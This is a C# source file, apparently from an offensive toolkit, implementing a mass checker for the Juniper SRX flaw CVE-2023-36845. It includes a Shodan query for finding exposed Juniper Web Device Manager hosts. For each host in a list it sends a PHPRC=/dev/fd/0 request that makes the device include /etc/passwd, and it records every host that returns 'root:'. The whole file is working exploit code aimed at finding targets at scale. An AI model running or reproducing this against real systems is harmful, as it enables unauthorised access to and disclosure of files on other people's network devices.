using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace OelianderUI.Helpers.Exploits
{
    /// 
    /// Juniper SRX Firewall Vulnerability [CVE-2023-36845]
    /// 
    
    public class JuniperFireWall
    {
        internal static readonly string ShodanSearchPattern = "title:\"Juniper Web Device Manager\"";
        private static readonly HttpClient client = new HttpClient();

        // Check if the vulnerability exists for the given URL
        static async Task<bool> CheckVulnerability(string url)
        {
            try
            {
                HttpResponseMessage response = await client.PostAsync(url, new FormUrlEncodedContent(new[] { new KeyValuePair<string, string>("auto_prepend_file", "/etc/passwd") }));
                string responseText = await response.Content.ReadAsStringAsync();

                return responseText.Contains("root:");
            }
            catch (Exception)
            {
                return false;
            }
        }

        static async Task CheckJuniperVuln(string targetFile)
        {
            if (string.IsNullOrEmpty(targetFile))
            {
                //Console.WriteLine("Both input and output files must be specified.");
                Objects.ShowAlert("ERROR", "Target File not Specified", 2);
                return;
            }
            if (!Directory.Exists("Results/JuniperFW"))
                Directory.CreateDirectory("Results/JuniperFW");
            try
            {
                var hosts = File.ReadAllLines(targetFile);
                using (StreamWriter writer = new StreamWriter("Results/JuniperFW/results.txt"))
                {
                    foreach (var host in hosts)
                    {
                        string trimmedHost = host.Trim();
                        if (!string.IsNullOrEmpty(trimmedHost))
                        {
                            bool isVuln = false;
                            foreach (var schema in new[] { "http://", "https://" })
                            {
                                string url = $"{schema}{trimmedHost}/?PHPRC=/dev/fd/0";
                                if (await CheckVulnerability(url))
                                {
                                    isVuln = true;
                                    break;
                                }
                            }

                            string result = isVuln ? $"{trimmedHost} is vulnerable to CVE-2023-36845" : $"{trimmedHost} is not vulnerable to CVE-2023-36845";
                            await writer.WriteLineAsync(result);
                            Console.WriteLine(result);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Objects.ShowAlert($"Error", ex.Message, 2);
            }
        }
    }
}

